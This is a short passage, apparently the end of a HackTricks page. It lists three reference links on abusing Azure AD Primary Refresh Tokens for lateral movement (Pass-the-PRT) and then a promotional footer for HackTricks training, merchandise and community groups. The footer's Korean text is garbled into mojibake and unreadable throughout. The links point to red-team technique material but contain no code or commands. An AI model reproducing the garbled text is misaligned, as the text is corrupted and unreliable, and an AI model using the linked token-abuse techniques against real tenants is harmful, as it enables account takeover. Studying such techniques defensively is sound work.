* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [https://www.youtube.com/watch?v=x609c-MUZ\_g](https://www.youtube.com/watch?v=x609c-MUZ\_g)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ ì œë¡œì—ì„œ ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ì„ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
